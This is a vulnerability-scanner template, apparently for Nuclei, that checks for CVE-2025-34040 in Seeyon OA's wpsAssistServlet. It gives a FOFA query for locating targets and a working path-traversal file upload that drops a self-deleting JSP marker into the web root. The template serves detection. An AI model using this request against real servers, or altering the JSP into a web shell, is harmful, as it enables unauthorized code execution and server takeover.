id: zhiyuanOA-wpsAssistServlet-File-upload-CVE-2025-34040

info:
  name: 致远OA wpsAssistServlet 任意文件上传漏洞(CVE-2025-34040)
  author: Superhero
  severity: high
  description: |-
    fofa: app="致远互联-OA" && title="V8.0SP2"
    致远OA wpsAssistServlet接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://mp.weixin.qq.com/s/-LnxpwYw6Lz4ayZ1yywn1A
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{username}}.jsp&fileId=2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="upload"; filename="{{username}}.xls"
        Content-Type: application/vnd.ms-excel

        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
  - raw:
      - |
        GET /{{username}}.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'pboyjnnrfipmplsukdeczudsefxmywe'
      - type: status
        status: 
          - 200